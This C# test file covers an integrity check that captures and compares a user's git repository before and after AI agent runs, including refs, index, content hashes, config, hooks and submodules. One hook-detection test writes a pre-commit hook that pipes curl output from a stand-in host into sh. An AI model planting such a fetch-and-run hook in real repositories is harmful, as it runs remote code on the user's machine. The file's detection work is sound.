using System.IO;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using AgentStudio.Application.Git;
using AgentStudio.Infrastructure.Git;
using AgentStudio.Infrastructure.Processes;

namespace AgentStudio.Tests.Infrastructure.Git;

/// <summary>
/// The integrity check the engine runs before and after each agent run: a capture of the user's own repository whose
/// comparison lists every change, and nothing when only Agent Studio's own refs moved.
/// </summary>
[Trait("Category", "LocalTools")]
public sealed class UserRepositoryCaptureTests : GitManagerTestBase
{
    private Task<UserRepositoryState> CaptureAsync(GitWorktreeManager manager) => manager.CaptureUserRepositoryStateAsync(Repo.Root, Ct);

    private string NewCommit(string message) =>
        Repo.Run("commit-tree", Repo.BaseCommit + "^{tree}", "-p", Repo.BaseCommit, "-m", message).Trim();

    private GitWorktreeManager NewManager(CaptureBudget budget) =>
        new(new ProcessRunner(), new ExecutableLocator(), new GitWorktreeOptions(Repo.WorktreeRoot, CaptureBudget: budget));

    /// <summary>Ignores each pattern through <c>.git/info/exclude</c>.</summary>
    private void Ignore(params string[] patterns) =>
        File.AppendAllText(Path.Combine(Repo.Root, ".git", "info", "exclude"), string.Concat(patterns.Select(p => p + "\n")));

    private string FullPath(string relative) => Path.Combine(Repo.Root, relative.Replace('/', Path.DirectorySeparatorChar));

    /// <summary>Denies the current user the listing of <paramref name="folder"/>, a folder the test created; <see cref="AllowListing"/> undoes it.</summary>
    private static FileSystemAccessRule DenyListing(DirectoryInfo folder)
    {
        var rule = new FileSystemAccessRule(WindowsIdentity.GetCurrent().User!, FileSystemRights.ListDirectory, AccessControlType.Deny);
        var acl = folder.GetAccessControl();
        acl.AddAccessRule(rule);
        folder.SetAccessControl(acl);
        return rule;
    }

    private static void AllowListing(DirectoryInfo folder, FileSystemAccessRule rule)
    {
        var acl = folder.GetAccessControl();
        acl.RemoveAccessRule(rule);
        folder.SetAccessControl(acl);
    }

    /// <summary>
    /// Adds a submodule at <c>sub/</c>, checked out: a second repository next to this one, cloned into
    /// <c>.git/modules/sub</c>, with a <c>.git</c> file in <c>sub/</c>. Returns its folder.
    /// </summary>
    private string AddSubmodule()
    {
        var source = Path.Combine(Path.GetDirectoryName(Repo.Root)!, "sub-src");
        Directory.CreateDirectory(source);
        TempGitRepo.Git(source, "init", "-q", "-b", "main");
        TempGitRepo.Git(source, "config", "user.name", "Agent Studio Tests");
        TempGitRepo.Git(source, "config", "user.email", "tests@localhost");
        File.WriteAllText(Path.Combine(source, "inner.txt"), "dentro\n");
        TempGitRepo.Git(source, "add", "-A");
        TempGitRepo.Git(source, "commit", "-q", "-m", "sub");
        Repo.Run("-c", "protocol.file.allow=always", "submodule", "add", "-q", source, "sub");
        Repo.Run("commit", "-q", "-m", "submódulo");
        var folder = FullPath("sub");
        Assert.True(File.Exists(Path.Combine(folder, ".git")));
        return folder;
    }

    /// <summary>Two captures taken while <paramref name="folder"/> cannot be listed; the listing is allowed again before this returns, whatever happens.</summary>
    private async Task<(UserRepositoryState Before, UserRepositoryState After)> CaptureTwiceUnlistedAsync(GitWorktreeManager manager, string folder)
    {
        var locked = new DirectoryInfo(folder);
        var rule = DenyListing(locked);
        try
        {
            Assert.Throws<UnauthorizedAccessException>(() => locked.EnumerateFileSystemInfos().ToList());
            return (await CaptureAsync(manager), await CaptureAsync(manager));
        }
        finally
        {
            AllowListing(locked, rule);
        }
    }

    /// <summary>
    /// An ignored <c>cache/</c> whose content no capture verifies with a budget of one file: <c>a.bin</c> is hashed,
    /// <c>b.bin</c> runs out of the budget, and <c>c.bin</c> lies beyond it.
    /// </summary>
    private GitWorktreeManager UnverifiedCache()
    {
        Ignore("cache/");
        Repo.Write("cache/a.bin", "0123456789\n");
        Repo.Write("cache/b.bin", "0123456789\n");
        Repo.Write("cache/c.bin", "0123456789\n");
        return NewManager(new CaptureBudget(64 * 1024, 1024, 1));
    }

    [Fact]
    public async Task Capture_reads_HEAD_branches_tags_stash_index_and_status_of_the_user_repository()
    {
        Repo.Run("tag", "v1");
        Repo.Run("branch", "feature");
        Repo.Write("README.md", "# temp\nedición\n");
        Repo.Write("nueva/carpeta/nota.txt", "x");

        var state = await CaptureAsync(NewManager());

        Assert.Equal(Repo.BaseCommit, state.HeadCommit);
        Assert.Equal("refs/heads/main", state.HeadRef);
        Assert.Equal(Repo.BaseCommit, state.Branches["refs/heads/main"]);
        Assert.Equal(Repo.BaseCommit, state.Branches["refs/heads/feature"]);
        Assert.Equal(Repo.BaseCommit, state.Tags["refs/tags/v1"]);
        Assert.Null(state.StashCommit);
        Assert.Equal(64, state.IndexHash.Length);

        // Every untracked file is listed, not just its folder: a file added to an untracked folder must show.
        Assert.Equal([" M README.md", "?? nueva/carpeta/nota.txt"], state.PorcelainStatus);

        // Each listed file by the SHA-256 of its bytes; the configuration and the hooks of the repository too.
        Assert.Equal(["README.md", "nueva/carpeta/nota.txt"], state.Contents!.Keys);
        Assert.Equal(Convert.ToHexStringLower(SHA256.HashData(Encoding.UTF8.GetBytes("# temp\nedición\n"))), state.Contents["README.md"].Sha256);
        Assert.Equal(Convert.ToHexStringLower(SHA256.HashData(File.ReadAllBytes(Path.Combine(Repo.Root, ".git", "config")))), state.GitFiles![".git/config"].Sha256);
        Assert.All(state.GitFiles.Keys.Where(k => k != ".git/config"), k => Assert.StartsWith(".git/hooks/", k, StringComparison.Ordinal));
    }

    [Fact]
    public async Task Two_captures_of_an_untouched_repository_have_no_differences()
    {
        var manager = NewManager();
        Repo.Run("tag", "v1");
        Repo.Write("README.md", "# temp\nedición\n");
        Repo.Write("staged.txt", "x");
        Repo.Run("add", "staged.txt");
        Repo.Write("notas.txt", "sin seguimiento\n");
        Repo.Write("debug.log", "ignorado\n");
        File.AppendAllText(Path.Combine(Repo.Root, ".git", "info", "exclude"), "cache/\n");
        Repo.Write("cache/datos.bin", "ignorado\n");
        Repo.Write(".git/hooks/pre-commit", "#!/bin/sh\nexit 0\n");

        var differences = UserRepositoryState.Compare(await CaptureAsync(manager), await CaptureAsync(manager));

        Assert.Empty(differences);
    }

    [Fact]
    public async Task A_commit_on_the_current_branch_is_detected()
    {
        var manager = NewManager();
        var before = await CaptureAsync(manager);
        Repo.Write("a.txt", "x");
        Repo.Run("add", "a.txt");
        Repo.Run("commit", "-q", "-m", "commit del agente");

        var differences = UserRepositoryState.Compare(before, await CaptureAsync(manager));

        Assert.Contains(differences, d => d.StartsWith("HEAD moved", StringComparison.Ordinal) && d.Contains(Repo.Head, StringComparison.Ordinal));
        Assert.Contains(differences, d => d.StartsWith("Branch 'refs/heads/main' moved", StringComparison.Ordinal));
    }

    [Fact]
    public async Task A_moved_branch_is_detected()
    {
        var manager = NewManager();
        Repo.Run("branch", "feature");
        var before = await CaptureAsync(manager);
        var other = NewCommit("otro");
        Repo.Run("branch", "-f", "feature", other);

        var difference = Assert.Single(UserRepositoryState.Compare(before, await CaptureAsync(manager)));

        Assert.Equal($"Branch 'refs/heads/feature' moved from {Repo.BaseCommit} to {other}.", difference);
    }

    [Fact]
    public async Task A_new_tag_is_detected()
    {
        var manager = NewManager();
        var before = await CaptureAsync(manager);
        Repo.Run("tag", "v2");

        var difference = Assert.Single(UserRepositoryState.Compare(before, await CaptureAsync(manager)));

        Assert.Equal($"Tag 'refs/tags/v2' was created at {Repo.BaseCommit}.", difference);
    }

    [Fact]
    public async Task A_staged_change_is_detected_as_a_changed_index()
    {
        var manager = NewManager();
        Repo.Write("README.md", "# temp\nedición\n");
        var before = await CaptureAsync(manager);
        Repo.Run("add", "README.md");

        var differences = UserRepositoryState.Compare(before, await CaptureAsync(manager));

        Assert.Contains(differences, d => d.StartsWith("Index changed", StringComparison.Ordinal));
        Assert.Contains("Status line added: M  README.md", differences);
    }

    [Fact]
    public async Task A_flag_hidden_in_the_index_is_detected_even_when_the_status_does_not_change()
    {
        var manager = NewManager();
        var before = await CaptureAsync(manager);

        // assume-unchanged hides later edits of the file from `git status`: from now on the capture hashes it on its own.
        Repo.Run("update-index", "--assume-unchanged", "README.md");

        var differences = UserRepositoryState.Compare(before, await CaptureAsync(manager));

        Assert.Equal(2, differences.Count);
        Assert.StartsWith("Index changed", differences[0], StringComparison.Ordinal);
        Assert.Equal("Hidden tracked path 'README.md' appeared: it was created, or the status no longer shows it.", differences[1]);
    }

    [Fact]
    public async Task A_dirty_working_tree_is_detected()
    {
        var manager = NewManager();
        Repo.Write("nueva/a.txt", "ya estaba");
        var before = await CaptureAsync(manager);
        Repo.Write("README.md", "# temp\neditado por un agente\n");
        Repo.Write("nueva/b.txt", "nuevo dentro de una carpeta sin seguimiento");

        var differences = UserRepositoryState.Compare(before, await CaptureAsync(manager));

        Assert.Equal(["Status line added: M README.md", "Status line added: ?? nueva/b.txt"], differences.Select(d => d.Replace("  ", " ", StringComparison.Ordinal)).ToArray());
    }

    [Fact]
    public async Task Replacing_the_content_of_a_file_that_was_already_modified_is_detected()
    {
        var manager = NewManager();
        Repo.Write("README.md", "# temp\nAAAA del usuario\n");
        var before = await CaptureAsync(manager);

        // Same length, same status line (" M README.md"): only the bytes tell.
        Repo.Write("README.md", "# temp\nBBBB del agente\n");

        var difference = Assert.Single(UserRepositoryState.Compare(before, await CaptureAsync(manager)));

        Assert.Equal("Content of 'README.md' changed.", difference);
    }

    [Fact]
    public async Task Replacing_the_content_of_an_untracked_file_is_detected()
    {
        var manager = NewManager();
        Repo.Write("notas/nota.txt", "del usuario\n");
        var before = await CaptureAsync(manager);
        Repo.Write("notas/nota.txt", "de un agente\n");

        var difference = Assert.Single(UserRepositoryState.Compare(before, await CaptureAsync(manager)));

        Assert.Equal("Content of 'notas/nota.txt' changed.", difference);
    }

    [Fact]
    public async Task An_ignored_file_that_appears_or_changes_is_detected()
    {
        var manager = NewManager();
        Repo.Write("debug.log", "del usuario\n");
        var before = await CaptureAsync(manager);
        Repo.Write("debug.log", "de un agente\n");
        Repo.Write("otro.log", "nuevo\n");

        var differences = UserRepositoryState.Compare(before, await CaptureAsync(manager));

        Assert.Equal(["Status line added: !! otro.log", "Content of 'debug.log' changed."], differences);
    }

    [Fact]
    public async Task A_change_inside_an_ignored_folder_is_detected_by_content()
    {
        var manager = NewManager();
        File.AppendAllText(Path.Combine(Repo.Root, ".git", "info", "exclude"), "cache/\n");
        Repo.Write("cache/datos.bin", "del usuario\n");
        var before = await CaptureAsync(manager);
        Repo.Write("cache/datos.bin", "de un agente, más largo\n");

        var difference = Assert.Single(UserRepositoryState.Compare(before, await CaptureAsync(manager)));

        Assert.Equal("Content of 'cache/' changed.", difference);
    }

    [Fact]
    public async Task A_same_length_swap_inside_an_ignored_folder_with_the_timestamp_restored_is_detected()
    {
        // N-07: metadata (names, sizes, modification times) is identical, so only hashing the content can catch it.
        var manager = NewManager();
        File.AppendAllText(Path.Combine(Repo.Root, ".git", "info", "exclude"), "cache/\n");
        var file = Path.Combine(Repo.Root, "cache", "datos.bin");
        Repo.Write("cache/datos.bin", "AAAA del usuario\n");
        var when = File.GetLastWriteTimeUtc(file);
        var before = await CaptureAsync(manager);

        // Same length (17 bytes), same name, modification time restored: only the bytes differ.
        File.WriteAllText(file, "BBBB del usuario\n", new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
        File.SetLastWriteTimeUtc(file, when);

        var difference = Assert.Single(UserRepositoryState.Compare(before, await CaptureAsync(manager)));

        Assert.Equal("Content of 'cache/' changed.", difference);
    }

    [Fact]
    public async Task A_file_larger_than_the_per_file_cap_is_indeterminate_and_blocks()
    {
        var manager = NewManager();
        var big = Path.Combine(Repo.Root, "grande.bin");
        File.WriteAllBytes(big, new byte[(9 * 1024 * 1024) + 1]);

        // Two captures of an untouched too-large file: its content cannot be hashed, so it must not be trusted as unchanged.
        var difference = Assert.Single(UserRepositoryState.Compare(await CaptureAsync(manager), await CaptureAsync(manager)));

        Assert.Contains("grande.bin", difference, StringComparison.Ordinal);
        Assert.Contains("indeterminate", difference, StringComparison.Ordinal);
    }

    [Fact]
    public async Task A_big_ignored_folder_that_spends_the_budget_never_makes_a_status_file_indeterminate()
    {
        // The budget holds one file. An ignored folder that sorts first could spend it; a modified tracked file listed
        // after it must still be hashed by content and never become indeterminate (only ignored-folder content may).
        var manager = new GitWorktreeManager(new ProcessRunner(), new ExecutableLocator(), new GitWorktreeOptions(Repo.WorktreeRoot, CaptureBudget: new CaptureBudget(1024, 16, 1)));
        Repo.Write("zzz.txt", "original\n");
        Repo.Run("add", "zzz.txt");
        Repo.Run("commit", "-q", "-m", "fichero versionado");
        Repo.Write("zzz.txt", "modificado\n");
        File.AppendAllText(Path.Combine(Repo.Root, ".git", "info", "exclude"), "aaa-cache/\n");
        Repo.Write("aaa-cache/uno.bin", "0123456789\n");
        Repo.Write("aaa-cache/dos.bin", "0123456789\n");

        var state = await CaptureAsync(manager);

        var file = state.Contents!["zzz.txt"];
        Assert.Null(file.Indeterminate);
        Assert.Equal(Convert.ToHexStringLower(SHA256.HashData(Encoding.UTF8.GetBytes("modificado\n"))), file.Sha256);
        Assert.NotNull(state.Contents["aaa-cache/"].Indeterminate);
    }

    [Fact]
    public async Task Once_the_capture_budget_is_spent_the_remaining_ignored_folders_are_indeterminate()
    {
        // A budget of one file, spent only by ignored folders: the first (sorted) is hashed, the next overflows.
        var manager = new GitWorktreeManager(new ProcessRunner(), new ExecutableLocator(), new GitWorktreeOptions(Repo.WorktreeRoot, CaptureBudget: new CaptureBudget(1024, 64, 1)));
        File.AppendAllText(Path.Combine(Repo.Root, ".git", "info", "exclude"), "f1/\nf2/\n");
        Repo.Write("f1/a.bin", "0123456789\n");
        Repo.Write("f2/b.bin", "0123456789\n");

        var state = await CaptureAsync(manager);

        Assert.Null(state.Contents!["f1/"].Indeterminate);
        Assert.NotNull(state.Contents["f2/"].Indeterminate);
        var differences = UserRepositoryState.Compare(state, await manager.CaptureUserRepositoryStateAsync(Repo.Root, Ct));
        Assert.Contains(differences, d => d.Contains("f2/", StringComparison.Ordinal) && d.Contains("indeterminate", StringComparison.Ordinal));
    }

    /// <summary>
    /// R3-02: each entry of a folder is encoded with the length of its path and of its content, so a file whose bytes
    /// spell the name and the content of a second file never hashes like the pair.
    /// </summary>
    [Fact]
    public async Task A_folder_whose_file_spells_the_name_and_content_of_another_hashes_unlike_the_pair()
    {
        Ignore("uno/", "dos/");
        Repo.Write("uno/a.txt", "A");
        Repo.Write("uno/b.txt", "B");
        Repo.Write("dos/a.txt", "Ab.txt\nB");

        var contents = (await CaptureAsync(NewManager())).Contents!;

        Assert.Null(contents["uno/"].Indeterminate);
        Assert.Null(contents["dos/"].Indeterminate);
        Assert.NotEqual(contents["uno/"].Sha256, contents["dos/"].Sha256);
    }

    /// <summary>R3-02: what a folder hashes to depends only on what is inside it, never on where it is.</summary>
    [Fact]
    public async Task Two_identical_folders_have_the_same_content_hash_and_the_same_metadata()
    {
        Ignore("uno/", "dos/");
        var when = new DateTime(2026, 10, 1, 12, 0, 0, DateTimeKind.Utc);
        foreach (var folder in new[] { "uno", "dos" })
        {
            Repo.Write($"{folder}/a.txt", "A");
            Repo.Write($"{folder}/sub/b.txt", "B");
            File.SetLastWriteTimeUtc(FullPath($"{folder}/a.txt"), when);
            File.SetLastWriteTimeUtc(FullPath($"{folder}/sub/b.txt"), when);
            Directory.SetLastWriteTimeUtc(FullPath($"{folder}/sub"), when);
        }

        var contents = (await CaptureAsync(NewManager())).Contents!;

        Assert.NotNull(contents["uno/"].Sha256);
        Assert.Equal(contents["uno/"], contents["dos/"]);
    }

    /// <summary>
    /// R3-02: the metadata of every entry of a folder is compared, also past the capture budget, where its content is
    /// not hashed: a file added, removed, resized or touched there is a difference, not something only indeterminate.
    /// </summary>
    [Theory]
    [InlineData("added")]
    [InlineData("removed")]
    [InlineData("resized")]
    [InlineData("touched")]
    public async Task A_file_added_removed_resized_or_touched_past_the_capture_budget_is_a_difference(string change)
    {
        var manager = UnverifiedCache();
        var file = FullPath("cache/c.bin");
        var before = await CaptureAsync(manager);
        switch (change)
        {
            case "added":
                Repo.Write("cache/d.bin", "0123456789\n");
                break;
            case "removed":
                File.Delete(file);
                break;
            case "resized":
                File.AppendAllText(file, "más\n");
                break;
            default:
                File.SetLastWriteTimeUtc(file, File.GetLastWriteTimeUtc(file).AddMinutes(-5));
                break;
        }

        var after = await CaptureAsync(manager);
        var (differences, indeterminate) = UserRepositoryState.CompareInDetail(before, after);

        Assert.NotNull(before.Contents!["cache/"].Indeterminate);
        Assert.NotNull(after.Contents!["cache/"].Indeterminate);
        Assert.NotEqual(before.Contents["cache/"].Approximation, after.Contents["cache/"].Approximation);
        Assert.Equal(["Content of 'cache/' changed (approximate: by sizes and modification times, not by content)."], differences);
        Assert.Empty(indeterminate);
    }

    /// <summary>
    /// R3-02: NTFS keeps a copy of the modification time of each subfolder in its parent's listing and refreshes it late,
    /// when the subfolder is next opened, which is what listing it does. The capture reads that time from the subfolder
    /// itself, so its own walk never makes the next capture differ: right after a build wrote them, as here, two captures
    /// of an ignored folder compared by metadata find nothing.
    /// </summary>
    [Fact]
    public async Task Two_captures_right_after_the_subfolders_of_an_unverified_folder_were_written_find_no_difference()
    {
        var manager = UnverifiedCache();
        for (var folder = 0; folder < 20; folder++)
        {
            for (var file = 0; file < 5; file++)
            {
                Repo.Write($"cache/d{folder:D2}/f{file}.bin", "0123456789\n");
            }
        }

        var before = await CaptureAsync(manager);
        var (differences, indeterminate) = UserRepositoryState.CompareInDetail(before, await CaptureAsync(manager));

        Assert.NotNull(before.Contents!["cache/"].Indeterminate);
        Assert.Empty(differences);
        Assert.Equal("cache/", Assert.Single(indeterminate).Path);
    }

    /// <summary>
    /// R3-02: past the budget only the metadata is known, so a same-length swap that restores the timestamp leaves it as
    /// it was: the one change the comparison can only call indeterminate, for the engine to weigh (ADR-0012).
    /// </summary>
    [Fact]
    public async Task A_same_length_swap_past_the_capture_budget_with_the_timestamp_restored_stays_indeterminate()
    {
        var manager = UnverifiedCache();
        var file = FullPath("cache/c.bin");
        var when = File.GetLastWriteTimeUtc(file);
        var before = await CaptureAsync(manager);
        File.WriteAllText(file, "9876543210\n", new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
        File.SetLastWriteTimeUtc(file, when);

        var after = await CaptureAsync(manager);
        var (differences, indeterminate) = UserRepositoryState.CompareInDetail(before, after);

        Assert.Equal(before.Contents!["cache/"].Approximation, after.Contents!["cache/"].Approximation);
        Assert.Empty(differences);
        var entry = Assert.Single(indeterminate);
        Assert.Equal("cache/", entry.Path);
        Assert.Equal("the capture budget ran out inside this folder", entry.Reason);
    }

    /// <summary>
    /// R3-02: listing the metadata of the folders has a cap per capture, spent in sorted order. A folder past it has not
    /// even its metadata, so it can never be compared and always blocks.
    /// </summary>
    [Fact]
    public async Task A_folder_past_the_metadata_cap_has_no_approximation_and_is_a_difference()
    {
        var manager = NewManager(new CaptureBudget(64 * 1024, 1024 * 1024, 100, MaxFolderEntries: 3));
        Ignore("f1/", "f2/");
        Repo.Write("f1/a.bin", "x");
        Repo.Write("f1/b.bin", "x");
        Repo.Write("f2/a.bin", "x");
        Repo.Write("f2/b.bin", "x");

        var before = await CaptureAsync(manager);
        var (differences, indeterminate) = UserRepositoryState.CompareInDetail(before, await CaptureAsync(manager));

        Assert.Null(before.Contents!["f1/"].Indeterminate);
        Assert.NotEqual(string.Empty, before.Contents["f1/"].Approximation);
        Assert.Equal(string.Empty, before.Contents["f2/"].Approximation);
        Assert.NotNull(before.Contents["f2/"].Indeterminate);
        Assert.StartsWith("Content of 'f2/' could not be checked", Assert.Single(differences), StringComparison.Ordinal);
        Assert.Empty(indeterminate);
    }

    /// <summary>
    /// R3-03: a folder the capture cannot list is never taken for an empty one. When a folder anywhere inside an ignored
    /// folder cannot be listed (its ACL denies it here, though its files can still be opened by name), the whole folder
    /// has no metadata and always blocks; an empty subfolder is listed and verified like any other.
    /// </summary>
    [Fact]
    public async Task An_ignored_folder_with_a_subfolder_that_cannot_be_listed_has_no_metadata_and_always_blocks()
    {
        var manager = NewManager();
        Ignore("cache/", "hollow/");
        Repo.Write("cache/top.bin", "top\n");
        Repo.Write("cache/locked/secret.bin", "secret\n");
        Repo.Write("hollow/top.bin", "top\n");
        Directory.CreateDirectory(FullPath("hollow/empty"));

        var (before, after) = await CaptureTwiceUnlistedAsync(manager, FullPath("cache/locked"));
        var (differences, indeterminate) = UserRepositoryState.CompareInDetail(before, after);

        var cache = before.Contents!["cache/"];
        Assert.Null(cache.Sha256);
        Assert.Equal(string.Empty, cache.Approximation);
        Assert.Equal("the folder 'locked/' in it could not be listed", cache.Indeterminate);
        Assert.Null(before.Contents["hollow/"].Indeterminate);
        Assert.StartsWith("folder:2 entries;", before.Contents["hollow/"].Approximation, StringComparison.Ordinal);
        Assert.Equal(["Content of 'cache/' could not be checked: not even its sizes and modification times could be read (the folder 'locked/' in it could not be listed)."], differences);
        Assert.Empty(indeterminate);
    }

    /// <summary>
    /// R3-03: nor is a folder of the hooks folder that cannot be listed taken for an empty one: git can still run a hook
    /// from it by name. It is kept as a git file without metadata, so it always blocks.
    /// </summary>
    [Fact]
    public async Task A_folder_of_the_hooks_folder_that_cannot_be_listed_has_no_metadata_and_always_blocks()
    {
        var manager = NewManager();
        var hooks = Path.Combine(Path.GetDirectoryName(Repo.Root)!, "hooks del usuario");
        var lib = Path.Combine(hooks, "lib");
        Directory.CreateDirectory(lib);
        File.WriteAllText(Path.Combine(hooks, "pre-commit"), "#!/bin/sh\n. \"$(dirname \"$0\")/lib/helper.sh\"\n");
        File.WriteAllText(Path.Combine(lib, "helper.sh"), "#!/bin/sh\nexit 0\n");
        Repo.Run("config", "core.hooksPath", hooks.Replace('\\', '/'));

        var (before, after) = await CaptureTwiceUnlistedAsync(manager, lib);
        var (differences, indeterminate) = UserRepositoryState.CompareInDetail(before, after);

        var folder = before.GitFiles![lib + "/"];
        Assert.Equal(string.Empty, folder.Approximation);
        Assert.Equal("the folder could not be listed", folder.Indeterminate);
        Assert.Contains(Path.Combine(hooks, "pre-commit"), before.GitFiles.Keys);
        Assert.Equal([$"Git file '{lib}/' could not be checked: not even its sizes and modification times could be read (the folder could not be listed)."], differences);
        Assert.Empty(indeterminate);
    }

    /// <summary>
    /// R3-04: git does not look at the working tree of a file flagged assume-unchanged or skip-worktree, so a change of
    /// it shows in no status line and leaves the index as it was. The capture hashes those files by content all the same.
    /// </summary>
    [Fact]
    public async Task A_change_of_a_file_flagged_assume_unchanged_or_skip_worktree_is_detected()
    {
        var manager = NewManager();
        Repo.Run("update-index", "--assume-unchanged", "shared.txt");
        Repo.Run("update-index", "--skip-worktree", "README.md");
        var before = await CaptureAsync(manager);
        Repo.Write("shared.txt", "cambiado por un agente\n");
        Repo.Write("README.md", "# cambiado por un agente\n");

        var after = await CaptureAsync(manager);

        Assert.Empty(after.PorcelainStatus);
        Assert.Equal(before.IndexHash, after.IndexHash);
        Assert.Equal(["Hidden tracked path 'README.md' changed.", "Hidden tracked path 'shared.txt' changed."], UserRepositoryState.Compare(before, after));
    }

    /// <summary>
    /// R3-04: the status ignores submodules (<c>--ignore-submodules=all</c>, N-01), so a change inside one checked out
    /// shows in no status line either. The capture hashes its folder like an ignored one.
    /// </summary>
    [Fact]
    public async Task A_change_inside_a_checked_out_submodule_is_detected()
    {
        var manager = NewManager();
        var sub = AddSubmodule();
        var before = await CaptureAsync(manager);
        File.WriteAllText(Path.Combine(sub, "inner.txt"), "cambiado por un agente\n");

        var after = await CaptureAsync(manager);

        Assert.Empty(after.PorcelainStatus);
        Assert.Equal(["Hidden tracked path 'sub/' changed."], UserRepositoryState.Compare(before, after));
    }

    /// <summary>
    /// R3-04: a submodule is read from the user's repository only, its entry in the index and its files on disk. No git
    /// runs inside it, where its own configuration could run a program (N-01): no command starts in its folder or names
    /// it or its git directory.
    /// </summary>
    [Fact]
    public async Task The_capture_reads_a_submodule_without_running_git_inside_it()
    {
        var sub = AddSubmodule();
        var runner = new RecordingProcessRunner(new ProcessRunner());

        var state = await CaptureAsync(NewManager(runner));

        Assert.NotNull(state.HiddenTracked!["sub/"].Sha256);
        Assert.NotEmpty(runner.Specs);
        var modules = Path.Combine(Repo.Root, ".git", "modules");
        foreach (var spec in runner.Specs)
        {
            var named = spec.Arguments.Append(spec.WorkingDirectory ?? string.Empty).Concat(spec.Environment?.Values.OfType<string>() ?? []);
            Assert.DoesNotContain(named, value => Names(value, sub) || Names(value, modules));
        }

        static bool Names(string value, string folder) =>
            value.Replace('/', '\\').Contains(folder.Replace('/', '\\'), StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>
    /// R3-04: a submodule shares the budget of the folders, in the same sorted order: past it its content is not
    /// verified, and it is compared by the metadata of its entries.
    /// </summary>
    [Fact]
    public async Task A_submodule_past_the_capture_budget_is_compared_by_the_metadata_of_its_entries()
    {
        var sub = AddSubmodule();
        Ignore("aaa/");
        Repo.Write("aaa/uno.bin", "0123456789\n");
        var manager = NewManager(new CaptureBudget(64 * 1024, 1024, 1));
        var before = await CaptureAsync(manager);
        var inner = Path.Combine(sub, "inner.txt");
        File.SetLastWriteTimeUtc(inner, File.GetLastWriteTimeUtc(inner).AddMinutes(-5));

        var after = await CaptureAsync(manager);

        Assert.Null(before.Contents!["aaa/"].Indeterminate);
        Assert.Equal("the capture budget ran out inside this folder", before.HiddenTracked!["sub/"].Indeterminate);
        Assert.Equal(["Hidden tracked path 'sub/' changed (approximate: by sizes and modification times, not by content)."], UserRepositoryState.Compare(before, after));
    }

    [Fact]
    public async Task An_edited_git_config_is_detected()
    {
        var manager = NewManager();
        var before = await CaptureAsync(manager);
        Repo.Run("config", "alias.st", "status");

        var difference = Assert.Single(UserRepositoryState.Compare(before, await CaptureAsync(manager)));

        Assert.Equal("Git file '.git/config' changed.", difference);
    }

    [Fact]
    public async Task A_new_or_changed_hook_is_detected()
    {
        var manager = NewManager();
        Repo.Write(".git/hooks/pre-commit", "#!/bin/sh\nexit 0\n");
        var before = await CaptureAsync(manager);
        Repo.Write(".git/hooks/pre-commit", "#!/bin/sh\ncurl https://example.invalid | sh\n");
        Repo.Write(".git/hooks/post-merge", "#!/bin/sh\necho plantado\n");

        var differences = UserRepositoryState.Compare(before, await CaptureAsync(manager));

        Assert.Equal(["Git file '.git/hooks/post-merge' was created.", "Git file '.git/hooks/pre-commit' changed."], differences);
    }

    [Fact]
    public async Task A_hook_planted_in_the_folder_of_core_hooksPath_outside_the_repository_is_detected()
    {
        var manager = NewManager();
        var hooks = Path.Combine(Path.GetDirectoryName(Repo.Root)!, "hooks del usuario");
        Directory.CreateDirectory(hooks);
        Repo.Run("config", "core.hooksPath", hooks.Replace('\\', '/'));
        var before = await CaptureAsync(manager);
        File.WriteAllText(Path.Combine(hooks, "post-checkout"), "#!/bin/sh\necho plantado\n");

        var difference = Assert.Single(UserRepositoryState.Compare(before, await CaptureAsync(manager)));

        Assert.Equal($"Git file '{Path.Combine(hooks, "post-checkout")}' was created.", difference);
    }

    [Fact]
    public async Task A_new_stash_is_detected()
    {
        var manager = NewManager();
        Repo.Write("README.md", "# temp\nedición\n");
        var before = await CaptureAsync(manager);
        Repo.Run("stash", "push", "-q");

        var differences = UserRepositoryState.Compare(before, await CaptureAsync(manager));

        Assert.Contains(differences, d => d.StartsWith("Stash changed from (none) to ", StringComparison.Ordinal));
        Assert.Contains("Status line removed:  M README.md", differences);
    }

    [Fact]
    public async Task A_detached_HEAD_is_captured_without_a_branch()
    {
        Repo.Run("checkout", "-q", "--detach");

        var state = await CaptureAsync(NewManager());

        Assert.Null(state.HeadRef);
        Assert.Equal(Repo.BaseCommit, state.HeadCommit);
    }

    [Fact]
    public async Task Everything_Agent_Studio_does_in_its_own_namespace_is_not_reported()
    {
        var manager = NewManager();
        Repo.Write("README.md", "# temp\nedición del usuario\n");
        Repo.Write("notas.txt", "sin seguimiento\n");
        Repo.Write("debug.log", "ignorado\n");
        File.AppendAllText(Path.Combine(Repo.Root, ".git", "info", "exclude"), "cache/\n");
        Repo.Write("cache/datos.bin", "ignorado\n");
        Repo.Write(".git/hooks/pre-commit", "#!/bin/sh\nexit 0\n");
        var before = await CaptureAsync(manager);
        Assert.NotEmpty(before.Contents!);
        Assert.Contains(".git/config", before.GitFiles!.Keys);
        Assert.Contains(".git/hooks/pre-commit", before.GitFiles!.Keys);

        var integration = await EnsureAsync(manager, "_integration");
        var t1 = await EnsureAsync(manager, "T1");
        var c1 = await CommitInAsync(manager, t1, "src/Calc/Multiply.cs", "// multiplica\n");
        var branch = "agentstudio/run-" + TestRun.Value;
        await manager.EnsureRefAsync(Repo.Root, branch, Repo.BaseCommit, Ct);
        await manager.MergeIntoAsync(Repo.Root, branch, Repo.BaseCommit, c1, "Integra T1", Ct);
        await manager.MergeIntoAsync(Repo.Root, integration.RefName, Repo.BaseCommit, c1, "Integra T1", Ct);
        await manager.CheckoutAsync(t1, Repo.BaseCommit, Ct);
        await manager.RemoveAsync(t1, discardChanges: false, Ct);
        Repo.Run("update-ref", "refs/agentstudio/otra/ref", Repo.BaseCommit);

        Assert.Empty(UserRepositoryState.Compare(before, await CaptureAsync(manager)));
    }

    [Fact]
    public async Task Capture_refuses_a_worktree_as_the_repository()
    {
        var manager = NewManager();
        var lease = await EnsureAsync(manager, "T1");

        await Assert.ThrowsAsync<WorktreeOwnershipException>(() => manager.CaptureUserRepositoryStateAsync(lease.Path, Ct));
        Assert.True(Directory.Exists(lease.Path));
    }
}
